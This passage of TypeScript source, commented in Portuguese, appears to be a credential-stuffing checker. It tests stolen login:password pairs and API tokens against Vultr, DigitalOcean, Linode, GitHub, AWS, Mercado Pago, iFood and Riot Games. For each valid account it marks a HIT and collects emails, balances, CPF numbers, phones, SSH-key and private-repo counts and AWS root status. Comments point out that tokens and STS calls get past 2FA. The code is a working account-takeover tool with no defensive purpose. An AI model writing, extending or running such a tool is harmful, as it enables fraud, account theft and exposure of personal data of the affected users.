        const line   = `[${label}] ${vcpu}vCPU | RAM:${ram} | SSD:${disk} | ${region} | ${status}${plan ? ` | ${plan}` : ""}`;
        parts.push(line);
      }
    }

    return { credential, login, status: "HIT", detail: parts.join(" || ") || "vultr_ok" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DIGITALOCEAN CHECKER — API token (password = token)
//  Retorna: email, status, e por droplet: nome, vCPU, RAM, disco, região, status
// ═══════════════════════════════════════════════════════════════════════════════
async function checkDigitalOcean(login: string, password: string): Promise<CheckResult> {
  const apiToken   = password.trim() || login.trim();
  const credential = `${login}:${password}`;
  try {
    // ── Account ───────────────────────────────────────────────────────────────
    const acctRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiToken}`,
      "-H", "Accept: application/json",
      "https://api.digitalocean.com/v2/account",
    ], 15_000);

    if (acctRes.statusCode === 401) {
      return { credential, login, status: "FAIL", detail: "token_invalido" };
    }
    if (acctRes.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${acctRes.statusCode}` };
    }

    const aj   = JSON.parse(acctRes.body) as Record<string, unknown>;
    const acct = (aj.account ?? aj) as Record<string, unknown>;
    const parts: string[] = [];
    if (acct.email)         parts.push(`email:${acct.email}`);
    if (acct.status)        parts.push(`status:${acct.status}`);
    if (acct.droplet_limit) parts.push(`limite:${acct.droplet_limit}`);

    // ── Droplets ──────────────────────────────────────────────────────────────
    const drRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiToken}`,
      "-H", "Accept: application/json",
      "https://api.digitalocean.com/v2/droplets?per_page=20",
    ], 12_000);

    if (drRes.statusCode === 200) {
      const dj       = JSON.parse(drRes.body) as Record<string, unknown>;
      const droplets = (dj.droplets as Record<string, unknown>[]) ?? [];
      const meta     = dj.meta as Record<string, unknown> | undefined;
      const total    = (meta?.total as number) ?? droplets.length;
      parts.push(`droplets:${total}`);

      for (const dr of droplets.slice(0, 5)) {
        const name   = dr.name ?? dr.id ?? "?";
        const sz     = dr.size as Record<string, unknown> | undefined;
        const vcpus  = sz?.vcpus ?? dr.vcpus ?? "?";
        const ram    = sz?.memory ?? dr.memory;
        const ramStr = ram !== undefined ? `${Math.round(Number(ram) / 1024)}GB` : "?";
        const disk   = sz?.disk ?? dr.disk;
        const diskStr = disk !== undefined ? `${disk}GB` : "?";
        const region = (dr.region as Record<string, unknown>)?.slug ?? dr.region ?? "?";
        const status = dr.status ?? "?";
        const line   = `[${name}] ${vcpus}vCPU | RAM:${ramStr} | SSD:${diskStr} | ${region} | ${status}`;
        parts.push(line);
      }
    }

    return { credential, login, status: "HIT", detail: parts.join(" || ") || "digitalocean_ok" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  LINODE (AKAMAI CLOUD) CHECKER — API token (password = token)
//  Retorna: email, nome, saldo, e por linode: label, tipo, vCPU, RAM, disco, região, status
// ═══════════════════════════════════════════════════════════════════════════════
async function checkLinode(login: string, password: string): Promise<CheckResult> {
  const apiToken   = password.trim() || login.trim();
  const credential = `${login}:${password}`;
  try {
    // ── Account ───────────────────────────────────────────────────────────────
    const acctRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiToken}`,
      "-H", "Accept: application/json",
      "https://api.linode.com/v4/account",
    ], 15_000);

    if (acctRes.statusCode === 401 || acctRes.statusCode === 403) {
      return { credential, login, status: "FAIL", detail: "token_invalido" };
    }
    if (acctRes.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${acctRes.statusCode}` };
    }

    const j     = JSON.parse(acctRes.body) as Record<string, unknown>;
    const parts: string[] = [];
    if (j.email)               parts.push(`email:${j.email}`);
    if (j.first_name)          parts.push(`nome:${j.first_name} ${j.last_name ?? ""}`.trim());
    if (j.balance !== undefined) parts.push(`saldo:$${j.balance}`);
    if (j.active_since)        parts.push(`desde:${String(j.active_since).split("T")[0]}`);

    // ── Instances list ────────────────────────────────────────────────────────
    const lnRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiToken}`,
      "-H", "Accept: application/json",
      "https://api.linode.com/v4/linode/instances?page_size=20",
    ], 12_000);

    if (lnRes.statusCode === 200) {
      const lj      = JSON.parse(lnRes.body) as Record<string, unknown>;
      const total   = (lj.results as number) ?? (lj.data as unknown[])?.length ?? 0;
      const linodes = (lj.data as Record<string, unknown>[]) ?? [];
      parts.push(`linodes:${total}`);

      // Fetch types map once for spec lookup (vcpus, ram, disk)
      let typesMap: Record<string, Record<string, unknown>> = {};
      const typesRes = await runCurl([
        "--compressed", "-L",
        "-H", `Authorization: Bearer ${apiToken}`,
        "-H", "Accept: application/json",
        "https://api.linode.com/v4/linode/types?page_size=200",
      ], 10_000);
      if (typesRes.statusCode === 200) {
        const tj = JSON.parse(typesRes.body) as Record<string, unknown>;
        for (const t of (tj.data as Record<string, unknown>[]) ?? []) {
          if (typeof t.id === "string") typesMap[t.id] = t;
        }
      }

      for (const ln of linodes.slice(0, 5)) {
        const label    = ln.label ?? ln.id ?? "?";
        const typeId   = String(ln.type ?? "");
        const typeInfo = typesMap[typeId];
        const vcpus    = typeInfo?.vcpus ?? "?";
        const ram      = typeInfo?.memory !== undefined ? `${Math.round(Number(typeInfo.memory) / 1024)}GB` : "?";
        const disk     = typeInfo?.disk !== undefined ? `${Math.round(Number(typeInfo.disk) / 1024)}GB` : "?";
        const region   = ln.region ?? "?";
        const status   = ln.status ?? "?";
        const created  = ln.created ? String(ln.created).split("T")[0] : "";
        const line     = `[${label}] ${vcpus}vCPU | RAM:${ram} | SSD:${disk} | ${region} | ${status}${created ? ` | criado:${created}` : ""}`;
        parts.push(line);
      }
    }

    return { credential, login, status: "HIT", detail: parts.join(" || ") || "linode_ok" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  GITHUB CHECKER — Personal Access Token (login = username, password = PAT)
//  PAT bypasses 2FA completamente — nenhum problema com contas 2FA ativas.
//  Retorna: user, nome, plano, repos públicos/privados, orgs, Copilot se ativo
// ═══════════════════════════════════════════════════════════════════════════════
// PAT token patterns: fine-grained (github_pat_), modern (ghp_/gho_/ghu_/ghs_/ghr_), classic (40 hex)
function looksLikeGitHubToken(s: string): boolean {
  const t = s.trim();
  return /^(ghp_|gho_|ghu_|ghs_|ghr_|github_pat_)/.test(t) || /^[0-9a-f]{40}$/i.test(t);
}

// ── GitHub web auth (username+password via scraping) ──────────────────────────
async function checkGitHubWeb(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/gh_${randomUUID().replace(/-/g, "")}.txt`;
  const GH_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36";

  try {
    // Step 1: GET login page → grab authenticity_token + cookies
    const loginRes = await runCurl([
      "-L",
      "-c", cookieFile, "-b", cookieFile,
      "-H", `User-Agent: ${GH_UA}`,
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "-H", "Accept-Language: en-US,en;q=0.9",
      "https://github.com/login",
    ], 20_000);

    const tokenMatch = loginRes.body.match(/name="authenticity_token"\s+value="([^"]+)"/);
    const timestampMatch = loginRes.body.match(/name="timestamp"\s+value="([^"]+)"/);
    const timestampSecretMatch = loginRes.body.match(/name="timestamp_secret"\s+value="([^"]+)"/);

    if (!tokenMatch) {
      return { credential, login, status: "ERROR", detail: "csrf_token_nao_encontrado" };
    }
    const csrfToken         = tokenMatch[1];
    const timestamp         = timestampMatch?.[1] ?? "";
    const timestampSecret   = timestampSecretMatch?.[1] ?? "";

    // Step 2: POST to /session with form data
    const formParts = [
      `commit=Sign+in`,
      `authenticity_token=${encodeURIComponent(csrfToken)}`,
      `login=${encodeURIComponent(login)}`,
      `password=${encodeURIComponent(password)}`,
      `webauthn-support=supported`,
      `webauthn-iuvpaa-support=supported`,
      `return_to=https%3A%2F%2Fgithub.com%2Flogin`,
      `allow_signup=`,
      `client_id=`,
      `integration=`,
      `required_field_41f4=`,
      ...(timestamp ? [`timestamp=${encodeURIComponent(timestamp)}`] : []),
      ...(timestampSecret ? [`timestamp_secret=${encodeURIComponent(timestampSecret)}`] : []),
    ].join("&");

    const sessionRes = await runCurl([
      "--max-redirs", "0",    // Do NOT follow redirect — read Location to determine outcome
      "-c", cookieFile, "-b", cookieFile,
      "-X", "POST",
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", `User-Agent: ${GH_UA}`,
      "-H", "Referer: https://github.com/login",
      "-H", "Origin: https://github.com",
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "-d", formParts,
      "https://github.com/session",
    ], 20_000);

    const loc = (sessionRes.location ?? "").toLowerCase();
    const rawLoc = sessionRes.location ?? "";

    // 2FA required — password IS correct, just blocked by 2FA
    if (loc.includes("two-factor") || loc.includes("sessions/two-factor") || sessionRes.body.includes("two-factor")) {
      // Follow the 2FA redirect to detect "weak or compromised password" warning
      try {
        const twoFaUrl = rawLoc.startsWith("http")
          ? rawLoc
          : `https://github.com${rawLoc || "/sessions/two-factor"}`;
        const twoFaRes = await runCurl([
          "-L", "-c", cookieFile, "-b", cookieFile,
          "-H", `User-Agent: ${GH_UA}`,
          twoFaUrl,
        ], 10_000);
        const body = twoFaRes.body.toLowerCase();
        if (body.includes("weak") || body.includes("compromised") || body.includes("password_reset") || body.includes("change your password")) {
          return { credential, login, status: "HIT", detail: `HIT:2FA+SENHA_COMPROMETIDA | user:${login}` };
        }
      } catch { /* non-fatal — fallthrough to generic 2FA HIT */ }
      return { credential, login, status: "HIT", detail: `HIT:2FA_REQUERIDO | user:${login}` };
    }
    // Device verification — password IS correct, device not trusted
    if (loc.includes("device-verification") || loc.includes("verified-device")) {
      return { credential, login, status: "HIT", detail: `HIT:VERIFICACAO_DISPOSITIVO | user:${login}` };
    }
    // WebAuthn / passkey — password IS correct, passkey blocks
    if (loc.includes("webauthn") || loc.includes("passkey")) {
      return { credential, login, status: "HIT", detail: `HIT:PASSKEY_REQUERIDO | user:${login}` };
    }
    // Redirect to home or dashboard → HIT
    if (sessionRes.statusCode === 302 && (loc === "/" || loc.includes("github.com/") || loc.includes("/dashboard") || !loc.includes("login"))) {
      return { credential, login, status: "HIT", detail: `web_login_ok | user:${login}` };
    }
    // Back to login page → wrong password
    if (loc.includes("/login") || sessionRes.statusCode === 200) {
      return { credential, login, status: "FAIL", detail: "senha_incorreta" };
    }
    // Rate limit or too many attempts
    if (sessionRes.statusCode === 429 || sessionRes.body.includes("too many")) {
      return { credential, login, status: "ERROR", detail: "rate_limited" };
    }
    return { credential, login, status: "ERROR", detail: `status_inesperado_${sessionRes.statusCode}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

async function checkGitHub(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  // Detectar qual campo contém o token PAT
  let token = "";
  if      (looksLikeGitHubToken(password)) token = password.trim();
  else if (looksLikeGitHubToken(login))    token = login.trim();
  else {
    // Credenciais não são PAT token — tentar web login (username+password)
    return checkGitHubWeb(login, password);
  }

  const GH_HEADERS = [
    "-H", `Authorization: Bearer ${token}`,
    "-H", "Accept: application/vnd.github+json",
    "-H", "X-GitHub-Api-Version: 2022-11-28",
    "-H", "User-Agent: curl/8.0",
  ];

  try {
    const userRes = await runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user"], 15_000);

    if (userRes.statusCode === 401)
      return { credential, login, status: "FAIL",  detail: "token_invalido" };
    if (userRes.statusCode === 403) {
      // Verificar se é rate-limit vs. falta de permissão
      const isRL = (userRes.headers?.["x-ratelimit-remaining"] as string) === "0"
                || userRes.body.includes("rate limit");
      return { credential, login, status: isRL ? "ERROR" : "FAIL",
               detail: isRL ? "rate_limited" : "token_sem_permissao" };
    }
    if (userRes.statusCode !== 200)
      return { credential, login, status: "ERROR", detail: `HTTP_${userRes.statusCode}` };

    const j = JSON.parse(userRes.body) as Record<string, unknown>;
    const parts: string[] = [];

    if (j.login)                             parts.push(`user:${j.login}`);
    if (j.name)                              parts.push(`nome:${j.name}`);
    if (j.email)                             parts.push(`email:${j.email}`);
    if (j.company)                           parts.push(`empresa:${j.company}`);
    if (j.bio)                               parts.push(`bio:${String(j.bio).slice(0, 50)}`);
    if (j.public_repos !== undefined)        parts.push(`repos_pub:${j.public_repos}`);
    if (j.total_private_repos !== undefined) parts.push(`repos_priv:${j.total_private_repos}`);
    if (j.followers !== undefined)           parts.push(`followers:${j.followers}`);
    if (j.created_at)                        parts.push(`criado:${String(j.created_at).split("T")[0]}`);
    const plan = j.plan as Record<string, unknown> | undefined;
    if (plan?.name) parts.push(`plano:${plan.name}`);
    if ((plan?.private_repos as number) > 0) parts.push(`repos_priv_plan:${plan!.private_repos}`);

    // Requisições paralelas: Copilot + Orgs + Emails privados + SSH Keys
    const [copRes, orgRes, emailRes, sshRes] = await Promise.all([
      runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user/copilot_billing"], 10_000),
      runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user/orgs"],            10_000),
      runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user/emails"],          10_000),
      runCurl(["--compressed", "-L", ...GH_HEADERS, "https://api.github.com/user/keys"],            10_000),
    ]);

    if (copRes.statusCode === 200) {
      try {
        const cj = JSON.parse(copRes.body) as Record<string, unknown>;
        parts.push(`copilot:${cj.plan_type ?? cj.seat_management_setting ?? "ativo"}✅`);
      } catch { /**/ }
    }

    if (orgRes.statusCode === 200) {
      try {
        const orgs = JSON.parse(orgRes.body) as Record<string, unknown>[];
        if (orgs.length > 0) {
          const names = orgs.slice(0, 5).map(o => o.login ?? "?").join(",");
          parts.push(`orgs:${orgs.length}(${names})`);
        }
      } catch { /**/ }
    }

    if (emailRes.statusCode === 200) {
      try {
        const emails = JSON.parse(emailRes.body) as Record<string, unknown>[];
        const primary = emails.find(e => e.primary && e.verified);
        if (primary?.email && !parts.some(p => p.startsWith("email:")))
          parts.push(`email:${primary.email}`);
        if (emails.length > 1) parts.push(`emails_total:${emails.length}`);
      } catch { /**/ }
    }

    if (sshRes.statusCode === 200) {
      try {
        const keys = JSON.parse(sshRes.body) as unknown[];
        if (keys.length > 0) parts.push(`ssh_keys:${keys.length}`);
      } catch { /**/ }
    }

    return { credential, login, status: "HIT", detail: parts.join(" | ") || "github_ok" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  AWS CHECKER — IAM Access Key (login = access_key_id, password = secret_key)
//  STS GetCallerIdentity NUNCA exige MFA — funciona mesmo com MFA ativado na conta.
//  Retorna: account_id, ARN, tipo (root / iam_user / role)
// ═══════════════════════════════════════════════════════════════════════════════
async function checkAWS(login: string, password: string): Promise<CheckResult> {
  const accessKey  = login.trim();
  const secretKey  = password.trim();
  const credential = `${login}:${password}`;
  try {
    const service   = "sts";
    const region    = "us-east-1";
    const host      = "sts.amazonaws.com";
    const body      = "Action=GetCallerIdentity&Version=2011-06-15";
    const now       = new Date();
    const amzDate   = now.toISOString().replace(/[:\-]|\.\d{3}/g, "").slice(0, 15) + "Z";
    const dateStamp = amzDate.slice(0, 8);

    const payloadHash  = createHash("sha256").update(body).digest("hex");
    const canonHeaders = `content-type:application/x-www-form-urlencoded\nhost:${host}\nx-amz-date:${amzDate}\n`;
    const signedHdrs   = "content-type;host;x-amz-date";
    const canonRequest = ["POST", "/", "", canonHeaders, signedHdrs, payloadHash].join("\n");
    const credScope    = `${dateStamp}/${region}/${service}/aws4_request`;
    const strToSign    = `AWS4-HMAC-SHA256\n${amzDate}\n${credScope}\n${createHash("sha256").update(canonRequest).digest("hex")}`;

    function hmac(key: Buffer | string, data: string) {
      return createHmac("sha256", key).update(data).digest();
    }
    const sigKey    = hmac(hmac(hmac(hmac(`AWS4${secretKey}`, dateStamp), region), service), "aws4_request");
    const signature = createHmac("sha256", sigKey).update(strToSign).digest("hex");
    const authHdr   = `AWS4-HMAC-SHA256 Credential=${accessKey}/${credScope}, SignedHeaders=${signedHdrs}, Signature=${signature}`;

    const result = await runCurl([
      "--compressed", "-L",
      "-X", "POST",
      "-H", `Authorization: ${authHdr}`,
      "-H", `x-amz-date: ${amzDate}`,
      "-H", "content-type: application/x-www-form-urlencoded",
      "--data-raw", body,
      `https://${host}/`,
    ], 15_000);

    if (result.statusCode === 200) {
      const parts: string[] = [];
      const account = result.body.match(/<Account>(\d+)<\/Account>/)?.[1];
      const userId  = result.body.match(/<UserId>([^<]+)<\/UserId>/)?.[1];
      const arn     = result.body.match(/<Arn>([^<]+)<\/Arn>/)?.[1];
      if (account) parts.push(`account:${account}`);
      if (userId)  parts.push(`userId:${userId}`);
      if (arn) {
        parts.push(`arn:${arn}`);
        if      (arn.includes(":root"))           parts.push("tipo:ROOT⚠️");
        else if (arn.includes(":assumed-role"))   parts.push("tipo:role");
        else                                      parts.push("tipo:iam_user");
      }
      return { credential, login, status: "HIT", detail: parts.join(" | ") || "aws_ok" };
    }
    if (result.statusCode === 403) {
      if (result.body.includes("InvalidClientTokenId") || result.body.includes("AuthFailure")) {
        return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
      }
      return { credential, login, status: "FAIL", detail: "acesso_negado" };
    }
    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MERCADO PAGO CHECKER — email + senha (web scraping login ML/MP)
//  2FA: se conta tiver, retorna ERROR "2fa_required" e pula. Sem 2FA = HIT com saldo.
//  Retorna: nome, email, saldo disponível, saldo em conta
// ═══════════════════════════════════════════════════════════════════════════════
async function checkMercadoPago(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/mp_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
  try {
    // Step 1: GET login page — collect CSRF + cookies
    const initRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "5",
      "-c", cookieFile, "-b", cookieFile,
      "-A", DESKTOP_UA,
      "-H", "Accept: text/html,application/xhtml+xml",
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "https://www.mercadolibre.com.br/jms/mlb/lgz/login?platform_id=MP&go=%2F",
    ], 20_000);

    // Extract csrf_id from JSON embedded in page or hidden input
    let csrfId = "";
    const csrfJson = initRes.body.match(/"csrf_id"\s*:\s*"([^"]+)"/);
    if (csrfJson) csrfId = csrfJson[1];
    else {
      const csrfInput = initRes.body.match(/name="csrf_id"\s+value="([^"]+)"/);
      if (csrfInput) csrfId = csrfInput[1];
    }

    // Step 2: POST email
    const emailPayload = JSON.stringify({ email: login, csrf_id: csrfId });
    const emailRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "5",
      "-c", cookieFile, "-b", cookieFile,
      "-A", DESKTOP_UA,
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "-H", "Referer: https://www.mercadolibre.com.br/jms/mlb/lgz/login",
      "--data-raw", emailPayload,
      "https://www.mercadolibre.com.br/jms/mlb/lgz/security/email",
    ], 20_000);

    const emailBody = emailRes.body;
    if (emailBody.includes("user_not_found") || emailBody.includes("not_found")) {
      return { credential, login, status: "FAIL", detail: "email_nao_cadastrado" };
    }

    // Refresh csrf_id from response if present
    const newCsrf = emailBody.match(/"csrf_id"\s*:\s*"([^"]+)"/);
    if (newCsrf) csrfId = newCsrf[1];

    // Step 3: POST password
    const passPayload = JSON.stringify({ password, csrf_id: csrfId });
    const passRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "5",
      "-c", cookieFile, "-b", cookieFile,
      "-A", DESKTOP_UA,
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "-H", "Referer: https://www.mercadolibre.com.br/jms/mlb/lgz/login",
      "--data-raw", passPayload,
      "https://www.mercadolibre.com.br/jms/mlb/lgz/security/password",
    ], 20_000);

    const passBody = passRes.body;

    // 2FA check
    if (passBody.includes("otp") || passBody.includes("token_required") || passBody.includes("2fa") || passBody.includes("verification")) {
      return { credential, login, status: "ERROR", detail: "2fa_required" };
    }
    if (passBody.includes("invalid") || passBody.includes("incorrect") || passBody.includes("wrong") || passBody.includes("incorreta")) {
      return { credential, login, status: "FAIL", detail: "senha_incorreta" };
    }

    // Try to get access token from response
    const tokenMatch = passBody.match(/"access_token"\s*:\s*"([^"]+)"/);
    const accessToken = tokenMatch ? tokenMatch[1] : "";

    const parts: string[] = [];

    if (accessToken) {
      // Get user info + balance
      const meRes = await runCurl([
        "--compressed", "-L",
        "-H", `Authorization: Bearer ${accessToken}`,
        "-H", "Accept: application/json",
        "https://api.mercadolibre.com/users/me",
      ], 12_000);
      if (meRes.statusCode === 200) {
        const me = JSON.parse(meRes.body) as Record<string, unknown>;
        if (me.nickname)    parts.push(`user:${me.nickname}`);
        if (me.first_name)  parts.push(`nome:${me.first_name}`);
        if (me.email)       parts.push(`email:${me.email}`);
        if (me.identification) {
          const id = me.identification as Record<string, unknown>;
          if (id.number) parts.push(`doc:${id.number}`);
        }
      }
      // Balance
      const balRes = await runCurl([
        "--compressed", "-L",
        "-H", `Authorization: Bearer ${accessToken}`,
        "-H", "Accept: application/json",
        "https://api.mercadopago.com/v1/account/balance",
      ], 12_000);
      if (balRes.statusCode === 200) {
        const bal = JSON.parse(balRes.body) as Record<string, unknown>;
        if (bal.available_balance !== undefined) parts.push(`saldo_disponível:R$${bal.available_balance}`);
        if (bal.total_amount      !== undefined) parts.push(`saldo_total:R$${bal.total_amount}`);
        if (bal.currency_id)                     parts.push(`moeda:${bal.currency_id}`);
      }
    }

    // Fallback: check if body suggests success (redirect/token present)
    if (!accessToken && !passBody.includes("error") && (passBody.includes("code") || passRes.statusCode === 200)) {
      parts.push("mercadopago_ok");
    }

    if (parts.length === 0) {
      return { credential, login, status: "FAIL", detail: "login_failed" };
    }
    return { credential, login, status: "HIT", detail: parts.join(" | ") };

  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  IFOOD CHECKER — email + senha (API mobile iFood)
//  2FA: iFood usa OTP por email/SMS para algumas contas. Contas sem OTP = HIT.
//  Retorna: nome, email, cpf, telefone, endereços salvos
// ═══════════════════════════════════════════════════════════════════════════════
async function checkIFood(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const deviceId   = randomUUID();
  const baseHeaders = [
    "-H", "Content-Type: application/json",
    "-H", "Accept: application/json",
    "-H", "User-Agent: ifood/22.14.0 (Android; 33)",
    "-H", "app_version: 22.14.0",
    "-H", "device_id: " + deviceId,
    "-H", "platform: Android",
  ];
  try {
    // Step 1: pre-login (check if email exists + get auth methods)
    const preRes = await runCurl([
      "--compressed", "-L",
      ...baseHeaders,
      "-X", "POST",
      "--data-raw", JSON.stringify({ email: login }),
      "https://marketplace.ifood.com.br/v1/identity-providers/OTP/prelogin",
    ], 15_000);

    if (preRes.statusCode === 404) {
      return { credential, login, status: "FAIL", detail: "email_nao_cadastrado" };
    }

    // Step 2: login with password
    const loginPayload = JSON.stringify({
      email:    login,
      password,
      deviceId,
      platform: "Android",
    });
    const loginRes = await runCurl([
      "--compressed", "-L",
      ...baseHeaders,
      "-X", "POST",
      "--data-raw", loginPayload,
      "https://marketplace.ifood.com.br/v2/identity-providers/OTP/login",
    ], 15_000);

    const loginBody = loginRes.body;

    // OTP / 2FA required
    if (loginRes.statusCode === 403 || loginBody.includes("otp") || loginBody.includes("OTP") || loginBody.includes("codigo") || loginBody.includes("code_required")) {
      return { credential, login, status: "ERROR", detail: "otp_required" };
    }
    if (loginRes.statusCode === 401 || loginBody.includes("INVALID_PASSWORD") || loginBody.includes("invalid_credentials") || loginBody.includes("incorret")) {
      return { credential, login, status: "FAIL", detail: "senha_incorreta" };
    }
    if (loginRes.statusCode === 404 || loginBody.includes("USER_NOT_FOUND")) {
      return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
    }

    let accessToken = "";
    try {
      const lj = JSON.parse(loginBody) as Record<string, unknown>;
      accessToken = (lj.access_token ?? lj.accessToken ?? lj.token ?? "") as string;
    } catch { /**/ }

    if (!accessToken) {
      if (loginRes.statusCode >= 400) {
        return { credential, login, status: "FAIL", detail: `HTTP_${loginRes.statusCode}` };
      }
      return { credential, login, status: "FAIL", detail: "login_falhou" };
    }

    // Step 3: get customer profile
    const meRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${accessToken}`,
      "-H", "Accept: application/json",
      "-H", "User-Agent: ifood/22.14.0 (Android; 33)",
      "https://marketplace.ifood.com.br/v1/customer/me",
    ], 12_000);

    const parts: string[] = [];
    if (meRes.statusCode === 200) {
      const me = JSON.parse(meRes.body) as Record<string, unknown>;
      if (me.name)  parts.push(`nome:${me.name}`);
      if (me.email) parts.push(`email:${me.email}`);
      if (me.taxId ?? me.cpf)           parts.push(`cpf:${me.taxId ?? me.cpf}`);
      if (me.phone ?? me.phoneNumber)   parts.push(`tel:${me.phone ?? me.phoneNumber}`);
      const addrs = me.addresses as unknown[] | undefined ?? me.savedAddresses as unknown[] | undefined;
      if (addrs?.length) parts.push(`endereços:${addrs.length}`);
      const orders = me.totalOrders ?? me.ordersCount;
      if (orders !== undefined) parts.push(`pedidos:${orders}`);
    }
    if (parts.length === 0) parts.push("ifood_ok");

    return { credential, login, status: "HIT", detail: parts.join(" | ") };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  RIOT GAMES CHECKER — username + senha (auth.riotgames.com)
//  Foco: Valorant — retorna Riot ID, level, rank, região
//  2FA: se conta tiver MFA → ERROR "2fa_required". Sem MFA = HIT completo.
// ═══════════════════════════════════════════════════════════════════════════════
async function checkRiot(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/riot_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  const RIOT_UA = "RiotClient/89.0.0.1448.2194 rso-auth (Windows;10;;Professional, x64) riot_client/0";

  // Rank tier map (Valorant Episode 9+)
  const TIERS: Record<number, string> = {
    0: "Unranked",
    3: "Iron 1", 4: "Iron 2", 5: "Iron 3",
    6: "Bronze 1", 7: "Bronze 2", 8: "Bronze 3",
    9: "Silver 1", 10: "Silver 2", 11: "Silver 3",
    12: "Gold 1", 13: "Gold 2", 14: "Gold 3",
    15: "Platinum 1", 16: "Platinum 2", 17: "Platinum 3",
    18: "Diamond 1", 19: "Diamond 2", 20: "Diamond 3",
    21: "Ascendant 1", 22: "Ascendant 2", 23: "Ascendant 3",
    24: "Immortal 1", 25: "Immortal 2", 26: "Immortal 3",
    27: "Radiant",
  };

  try {
    // ── Step 1: Init auth session (get ASID + TDID cookies) ─────────────────
    await runCurl([
      "--compressed", "-L", "--max-redirs", "3",
      "-c", cookieFile, "-b", cookieFile,
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "-H", `User-Agent: ${RIOT_UA}`,
      "--data-raw", JSON.stringify({
        client_id: "play-valorant-web-prod",
        nonce: "1",
        redirect_uri: "https://playvalorant.com/opt_in",
        response_type: "token id_token",
        scope: "account openid",
      }),
      "https://auth.riotgames.com/api/v1/authorization",
    ], 15_000);

    // ── Step 2: Submit credentials ──────────────────────────────────────────
    const authRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "3",
      "-c", cookieFile, "-b", cookieFile,
      "-X", "PUT",
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "-H", `User-Agent: ${RIOT_UA}`,
      "--data-raw", JSON.stringify({ type: "auth", username: login, password, remember: false }),
      "https://auth.riotgames.com/api/v1/authorization",
    ], 15_000);

    let authJson: Record<string, unknown>;
    try { authJson = JSON.parse(authRes.body); }
    catch { return { credential, login, status: "ERROR", detail: "parse_error" }; }

    const authType = authJson.type as string;

    // MFA / 2FA
    if (authType === "multifactor") {
      return { credential, login, status: "ERROR", detail: "2fa_required" };
    }

    // Wrong password / rate limit
    if (authType === "auth") {
      const err = authJson.error as string | undefined;
      if (err === "auth_failure")  return { credential, login, status: "FAIL",  detail: "credenciais_invalidas" };
      if (err === "rate_limited")  return { credential, login, status: "ERROR", detail: "rate_limited" };
      if (err === "login_required") return { credential, login, status: "FAIL", detail: "login_required" };
    }

    // Extract access_token from redirect URI fragment
    const uri = ((authJson.response as Record<string, unknown>)?.parameters as Record<string, unknown>)?.uri as string ?? "";
    const tokenMatch = uri.match(/access_token=([^&]+)/);
    if (!tokenMatch) {
      return { credential, login, status: "FAIL", detail: "auth_falhou" };
    }
    const accessToken = decodeURIComponent(tokenMatch[1]);

    // ── Step 3: Entitlements token ─────────────────────────────────────────
    const entRes = await runCurl([
      "--compressed", "-L",
      "-X", "POST",
